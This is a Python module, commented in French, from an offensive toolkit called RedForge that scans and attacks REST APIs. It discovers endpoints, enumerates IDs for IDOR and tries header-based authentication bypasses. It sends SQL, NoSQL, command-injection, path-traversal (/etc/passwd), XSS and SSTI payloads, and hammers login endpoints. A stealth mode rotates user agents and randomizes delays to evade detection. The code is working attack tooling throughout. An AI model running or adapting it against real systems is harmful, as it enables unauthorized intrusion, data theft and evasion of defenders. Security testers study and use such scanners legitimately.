#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'attaques API pour RedForge
Détection et exploitation des vulnérabilités d'API REST
Version: 2.0.0 - Support Multi-Attaque, Stealth & APT
"""

import re
import json
import time
import random
import requests
from typing import Dict, Any, List, Optional, Tuple
from urllib.parse import urlparse, quote, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field

from src.utils.color_output import console


@dataclass
class APIAttackConfig:
    """Configuration des attaques API"""
    stealth_mode: bool = False
    aggressive_mode: bool = False
    threads: int = 5
    timeout: int = 30
    delay_min: float = 0.5
    delay_max: float = 2.0
    user_agents: List[str] = field(default_factory=lambda: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    ])


class APIAttacks:
    """Attaques sur les API REST avec support multi-attaque et stealth"""
    
    def __init__(self):
        self.config = APIAttackConfig()
        self.current_user_agent_index = 0
        
        self.common_endpoints = [
            # REST API
            "/api", "/api/v1", "/api/v2", "/api/v3", "/api/v4",
            "/rest", "/rest/v1", "/rest/v2",
            "/v1/api", "/v2/api", "/v3/api",
            # Documentation
            "/swagger", "/swagger.json", "/swagger.yaml", "/swagger-ui",
            "/openapi", "/openapi.json", "/openapi.yaml",
            "/api-docs", "/docs", "/redoc", "/rapidoc",
            # GraphQL
            "/graphql", "/graphiql", "/gql", "/graph",
            # Admin
            "/admin/api", "/manage/api", "/management/api",
            "/internal/api", "/private/api",
            # Authentication
            "/auth", "/login", "/oauth", "/token", "/api/token",
            "/authenticate", "/api/auth", "/v1/auth",
            # Common
            "/users", "/user", "/profile", "/account", "/me",
            "/posts", "/comments", "/products", "/orders", "/items",
            "/search", "/query", "/filter", "/list",
            "/upload", "/download", "/file", "/files", "/media",
            "/config", "/settings", "/preferences"
        ]
        
        self.idor_patterns = [
            r'/users/(\d+)', r'/user/(\d+)', r'/profile/(\d+)',
            r'/orders/(\d+)', r'/transactions/(\d+)', r'/documents/(\d+)',
            r'/customers/(\d+)', r'/accounts/(\d+)', r'/payments/(\d+)',
            r'/invoices/(\d+)', r'/tickets/(\d+)', r'/messages/(\d+)'
        ]
        
        self.rate_limit_endpoints = [
            "/login", "/auth", "/token", "/reset-password", "/register",
            "/signup", "/signin", "/forgot-password", "/verify"
        ]
        
        self.auth_bypass_headers = [
            ("X-Forwarded-For", "127.0.0.1"),
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/admin"),
            ("X-HTTP-Method-Override", "GET"),
            ("X-Forwarded-Host", "localhost"),
            ("X-Proxy-Host", "localhost"),
            ("X-Real-IP", "127.0.0.1"),
            ("X-Originating-IP", "127.0.0.1")
        ]
        
        self.injection_payloads = [
            # SQL Injection
            ("'", "sql"),
            ("\"", "sql"),
            ("1' OR '1'='1", "sql"),
            ("1' AND 1=1--", "sql"),
            ("1' AND 1=2--", "sql"),
            # Path Traversal
            ("../etc/passwd", "path_traversal"),
            ("../../etc/passwd", "path_traversal"),
            ("....//....//etc/passwd", "path_traversal"),
            # NoSQL Injection
            ("{'$ne': ''}", "nosql"),
            ("{'$gt': ''}", "nosql"),
            # Command Injection
            ("; ls", "cmd_injection"),
            ("| cat /etc/passwd", "cmd_injection"),
            ("& whoami", "cmd_injection"),
            # XSS
            ("<script>alert('XSS')</script>", "xss"),
            ("<img src=x onerror=alert('XSS')>", "xss"),
            # SSTI
            ("{{7*7}}", "ssti"),
            ("${7*7}", "ssti")
        ]
        
        # Payloads furtifs pour mode stealth
        self.stealth_payloads = [
            ("'", "sql"),
            ("../etc/passwd", "path_traversal"),
            ("<script>alert(1)</script>", "xss"),
        ]
        
        # Payloads agressifs pour mode agressif
        self.aggressive_payloads = self.injection_payloads
    
    def set_config(self, config: APIAttackConfig):
        """Définit la configuration des attaques"""
        self.config = config
    
    def set_stealth_mode(self, enabled: bool = True):
        """Active ou désactive le mode furtif"""
        self.config.stealth_mode = enabled
        if enabled:
            console.print_info("🕵️ Mode furtif activé pour les attaques API")
    
    def _get_next_user_agent(self) -> str:
        """Retourne le prochain User-Agent pour rotation"""
        if self.config.stealth_mode and len(self.config.user_agents) > 1:
            self.current_user_agent_index = (self.current_user_agent_index + 1) % len(self.config.user_agents)
            return self.config.user_agents[self.current_user_agent_index]
        return self.config.user_agents[0]
    
    def _random_delay(self):
        """Ajoute un délai aléatoire pour le mode furtif"""
        if self.config.stealth_mode:
            delay = random.uniform(self.config.delay_min, self.config.delay_max)
            time.sleep(delay)
    
    def _get_payloads(self) -> List[Tuple[str, str]]:
        """Retourne les payloads selon le mode"""
        if self.config.stealth_mode:
            return self.stealth_payloads
        elif self.config.aggressive_mode:
            return self.aggressive_payloads
        return self.injection_payloads
    
    def _make_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        """Effectue une requête HTTP avec gestion du mode furtif"""
        headers = kwargs.pop('headers', {})
        headers['User-Agent'] = self._get_next_user_agent()
        
        try:
            response = requests.request(method, url, headers=headers, 
                                       timeout=self.config.timeout, 
                                       verify=False, **kwargs)
            self._random_delay()
            return response
        except Exception as e:
            console.print_warning(f"Erreur requête {url}: {e}")
            return None
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités API
        
        Args:
            target: URL cible
            **kwargs:
                - endpoints: Endpoints personnalisés
                - api_key: Clé API pour authentification
                - bearer_token: Token Bearer
                - threads: Nombre de threads pour les tests parallèles
                - timeout: Timeout global
                - stealth: Mode furtif
                - aggressive: Mode agressif
        """
        # Appliquer la configuration depuis les kwargs
        if kwargs.get('stealth'):
            self.set_stealth_mode(True)
        if kwargs.get('aggressive'):
            self.config.aggressive_mode = True
        
        console.print_info("🔍 Test des attaques API")
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        vulnerabilities = []
        endpoints = kwargs.get('endpoints', self.common_endpoints)
        threads = kwargs.get('threads', self.config.threads)
        
        # Découverte d'endpoints
        discovered = self._discover_endpoints(target, endpoints, threads)
        
        # Tester chaque endpoint
        for endpoint in discovered:
            # Test IDOR
            idor_vulns = self._test_idor(endpoint)
            vulnerabilities.extend(idor_vulns)
            
            # Test authentification
            auth_vulns = self._test_auth_bypass(endpoint, kwargs)
            vulnerabilities.extend(auth_vulns)
            
            # Test injection
            injection_vulns = self._test_injection(endpoint)
            vulnerabilities.extend(injection_vulns)
            
            # Test rate limiting
            rate_vulns = self._test_rate_limiting(endpoint)
            vulnerabilities.extend(rate_vulns)
        
        # Test des méthodes HTTP
        method_vulns = self._test_http_methods(target)
        vulnerabilities.extend(method_vulns)
        
        # Test des versions API
        version_vulns = self._test_api_versions(target)
        vulnerabilities.extend(version_vulns)
        
        # Test de mass assignment
        mass_vulns = self._test_mass_assignment(target)
        vulnerabilities.extend(mass_vulns)
        
        return {
            "target": target,
            "stealth_mode": self.config.stealth_mode,
            "aggressive_mode": self.config.aggressive_mode,
            "discovered_endpoints": discovered,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "summary": self._generate_summary(vulnerabilities)
        }
    
    def _discover_endpoints(self, base_url: str, endpoints: List[str], 
                            threads: int) -> List[Dict[str, Any]]:
        """Découvre les endpoints API avec multi-threading"""
        discovered = []
        
        def check_endpoint(endpoint):
            test_url = urljoin(base_url, endpoint)
            response = self._make_request('GET', test_url)
            if response and response.status_code != 404:
                return {
                    "url": test_url,
                    "status": response.status_code,
                    "content_type": response.headers.get('Content-Type', ''),
                    "content_length": len(response.content)
                }
            return None
        
        console.print_info(f"   Découverte de {len(endpoints)} endpoints...")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_endpoint, ep): ep for ep in endpoints}
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    discovered.append(result)
                    console.print_success(f"      ✓ Endpoint découvert: {result['url']} (HTTP {result['status']})")
        
        return discovered
    
    def _test_idor(self, endpoint: Dict) -> List[Dict[str, Any]]:
        """Teste les vulnérabilités IDOR"""
        vulnerabilities = []
        url = endpoint['url']
        
        for pattern in self.idor_patterns:
            match = re.search(pattern, url)
            if match:
                original_id = match.group(1)
                
                test_ids = [str(int(original_id) + i) for i in range(-5, 6) 
                           if int(original_id) + i > 0 and i != 0]
                
                for test_id in test_ids[:10]:
                    test_url = url.replace(original_id, test_id)
                    response = self._make_request('GET', test_url)
                    
                    if response and response.status_code == 200 and len(response.text) > 100:
                        error_indicators = ['error', 'not found', 'unauthorized', 'forbidden']
                        is_error = any(ind in response.text.lower() for ind in error_indicators)
                        
                        if not is_error:
                            vulnerabilities.append({
                                "type": "idor",
                                "endpoint": url,
                                "parameter": "id",
                                "original_id": original_id,
                                "tested_id": test_id,
                                "severity": "HIGH",
                                "details": f"IDOR possible: {original_id} -> {test_id}"
                            })
                            console.print_warning(f"      ✓ IDOR détecté: {original_id} -> {test_id}")
                            break
        
        return vulnerabilities
    
    def _test_auth_bypass(self, endpoint: Dict, 
                          kwargs: Dict) -> List[Dict[str, Any]]:
        """Teste le contournement d'authentification"""
        vulnerabilities = []
        url = endpoint['url']
        
        headers = {}
        if kwargs.get('api_key'):
            headers['X-API-Key'] = kwargs['api_key']
        if kwargs.get('bearer_token'):
            headers['Authorization'] = f"Bearer {kwargs['bearer_token']}"
        
        # Tester sans authentification
        response = self._make_request('GET', url)
        if response and response.status_code == 200 and 'unauthorized' not in response.text.lower():
            vulnerabilities.append({
                "type": "missing_auth",
                "endpoint": url,
                "severity": "HIGH",
                "details": "Endpoint accessible sans authentification"
            })
            console.print_warning(f"      ✓ Auth manquante: {url}")
        
        # Tester les headers de bypass
        for header_name, header_value in self.auth_bypass_headers:
            test_headers = {header_name: header_value}
            response = self._make_request('GET', url, headers=test_headers)
            
            if response and response.status_code == 200:
                vulnerabilities.append({
                    "type": "auth_bypass",
                    "endpoint": url,
                    "header": header_name,
                    "value": header_value,
                    "severity": "HIGH",
                    "details": f"Auth bypass via {header_name}: {header_value}"
                })
                console.print_warning(f"      ✓ Auth bypass: {header_name}")
                break
        
        return vulnerabilities
    
    def _test_injection(self, endpoint: Dict) -> List[Dict[str, Any]]:
        """Teste les injections dans les API"""
        vulnerabilities = []
        url = endpoint['url']
        
        parsed = urlparse(url)
        params = []
        if parsed.query:
            import urllib.parse
            params = list(urllib.parse.parse_qs(parsed.query).keys())
        
        if not params:
            params = ['id', 'q', 'search', 'query', 'filter', 'sort']
        
        payloads = self._get_payloads()
        
        for param in params:
            for payload, injection_type in payloads:
                test_url = f"{url}?{param}={quote(payload)}"
                response = self._make_request('GET', test_url)
                
                if not response:
                    continue
                
                # Détection selon le type d'injection
                if injection_type == "sql":
                    error_indicators = [
                        'sql syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL',
                        'unterminated', 'stack trace', 'SQLSTATE'
                    ]
                    for indicator in error_indicators:
                        if indicator in response.text.lower():
                            vulnerabilities.append({
                                "type": "sql_injection",
                                "endpoint": url,
                                "parameter": param,
                                "payload": payload,
                                "severity": "CRITICAL",
                                "details": f"Injection SQL possible avec {payload[:30]}"
                            })
                            console.print_warning(f"      ✓ SQL Injection: {param}")
                            break
                
                elif injection_type == "path_traversal":
                    if 'root:' in response.text or 'bin:' in response.text:
                        vulnerabilities.append({
                            "type": "path_traversal",
                            "endpoint": url,
                            "parameter": param,
                            "payload": payload,
                            "severity": "HIGH",
                            "details": f"Path Traversal possible avec {payload}"
                        })
                        console.print_warning(f"      ✓ Path Traversal: {param}")
                        break
                
                elif injection_type == "cmd_injection":
                    cmd_indicators = ['uid=', 'gid=', 'groups=', 'root:']
                    for indicator in cmd_indicators:
                        if indicator in response.text.lower():
                            vulnerabilities.append({
                                "type": "command_injection",
                                "endpoint": url,
                                "parameter": param,
                                "payload": payload,
                                "severity": "CRITICAL",
                                "details": f"Injection de commande possible avec {payload}"
                            })
                            console.print_warning(f"      ✓ Command Injection: {param}")
                            break
                
                elif injection_type == "xss":
                    if payload in response.text:
                        vulnerabilities.append({
                            "type": "xss",
                            "endpoint": url,
                            "parameter": param,
                            "payload": payload,
                            "severity": "HIGH",
                            "details": f"XSS possible avec {payload[:30]}"
                        })
                        console.print_warning(f"      ✓ XSS: {param}")
                        break
                
                elif injection_type == "ssti":
                    if '49' in response.text and '7*7' in payload:
                        vulnerabilities.append({
                            "type": "ssti",
                            "endpoint": url,
                            "parameter": param,
                            "payload": payload,
                            "severity": "CRITICAL",
                            "details": f"SSTI possible avec {payload}"
                        })
                        console.print_warning(f"      ✓ SSTI: {param}")
                        break
        
        return vulnerabilities
    
    def _test_rate_limiting(self, endpoint: Dict) -> List[Dict[str, Any]]:
        """Teste le rate limiting"""
        vulnerabilities = []
        url = endpoint['url']
        
        is_sensitive = any(ep in url.lower() for ep in self.rate_limit_endpoints)
        if not is_sensitive:
            return vulnerabilities
        
        success_count = 0
        request_count = 30 if self.config.stealth_mode else 50
        
        console.print_info(f"      Test rate limiting sur {url[:50]}...")
        
        for i in range(request_count):
            response = self._make_request('GET', url)
            if response and response.status_code == 200:
                success_count += 1
            time.sleep(0.1)
        
        threshold = 0.7 if self.config.stealth_mode else 0.8
        if success_count > request_count * threshold:
            vulnerabilities.append({
                "type": "missing_rate_limit",
                "endpoint": url,
                "severity": "MEDIUM",
                "details": f"Absence de rate limiting: {success_count}/{request_count} requêtes réussies"
            })
            console.print_warning(f"      ✓ Rate limiting manquant ({success_count}/{request_count})")
        
        return vulnerabilities
    
    def _test_http_methods(self, target: str) -> List[Dict[str, Any]]:
        """Teste les méthodes HTTP non standards"""
        vulnerabilities = []
        methods = ['PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']
        
        for method in methods:
            response = self._make_request(method, target)
            if response and response.status_code not in [404, 405, 501]:
                vulnerabilities.append({
                    "type": "http_method",
                    "method": method,
                    "severity": "MEDIUM" if method != 'TRACE' else "HIGH",
                    "details": f"Méthode {method} acceptée (HTTP {response.status_code})"
                })
                console.print_info(f"      ✓ Méthode HTTP acceptée: {method}")
        
        return vulnerabilities
    
    def _test_api_versions(self, target: str) -> List[Dict[str, Any]]:
        """Teste les versions d'API obsolètes"""
        vulnerabilities = []
        versions = ['v1', 'v2', 'v3', 'v4', 'old', 'deprecated', 'beta', 'alpha', 'dev']
        
        for version in versions:
            test_url = target.rstrip('/') + '/' + version
            response = self._make_request('GET', test_url)
            
            if response and response.status_code == 200:
                vulnerabilities.append({
                    "type": "deprecated_version",
                    "version": version,
                    "severity": "MEDIUM",
                    "details": f"Version API accessible: {version}"
                })
                console.print_info(f"      ✓ Version API trouvée: {version}")
        
        return vulnerabilities
    
    def _test_mass_assignment(self, target: str) -> List[Dict[str, Any]]:
        """Teste les vulnérabilités de mass assignment"""
        vulnerabilities = []
        
        mass_fields = [
            'admin', 'is_admin', 'role', 'is_admin', 'is_superuser',
            'privilege', 'access_level', 'permission', 'group',
            'status', 'verified', 'approved', 'active'
        ]
        
        for field in mass_fields:
            test_url = f"{target}?{field}=true"
            response = self._make_request('GET', test_url)
            
            if response and field in response.text.lower():
                vulnerabilities.append({
                    "type": "mass_assignment",
                    "field": field,
                    "severity": "HIGH",
                    "details": f"Mass assignment possible avec {field}"
                })
                console.print_warning(f"      ✓ Mass assignment: {field}")
                break
        
        return vulnerabilities
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        return {
            "total": len(vulnerabilities),
            "stealth_mode": self.config.stealth_mode,
            "by_type": {
                "idor": len([v for v in vulnerabilities if v['type'] == 'idor']),
                "auth_bypass": len([v for v in vulnerabilities if v['type'] == 'auth_bypass']),
                "injection": len([v for v in vulnerabilities if v['type'] in ['sql_injection', 'command_injection', 'xss', 'ssti', 'path_traversal']]),
                "missing_auth": len([v for v in vulnerabilities if v['type'] == 'missing_auth']),
                "missing_rate_limit": len([v for v in vulnerabilities if v['type'] == 'missing_rate_limit']),
                "deprecated_version": len([v for v in vulnerabilities if v['type'] == 'deprecated_version']),
                "mass_assignment": len([v for v in vulnerabilities if v['type'] == 'mass_assignment'])
            },
            "critical": len([v for v in vulnerabilities if v['severity'] == 'CRITICAL']),
            "high": len([v for v in vulnerabilities if v['severity'] == 'HIGH']),
            "medium": len([v for v in vulnerabilities if v['severity'] == 'MEDIUM'])
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    api = APIAttacks()
    
    # Test mode standard
    print("=== Mode Standard ===")
    results = api.scan("https://api.example.com")
    print(f"Vulnérabilités API: {results['count']}")
    
    # Test mode furtif
    print("\n=== Mode Furtif ===")
    api.set_stealth_mode(True)
    results = api.scan("https://api.example.com")
    print(f"Vulnérabilités API (stealth): {results['count']}")
    print(f"  - Stealth mode: {results['stealth_mode']}")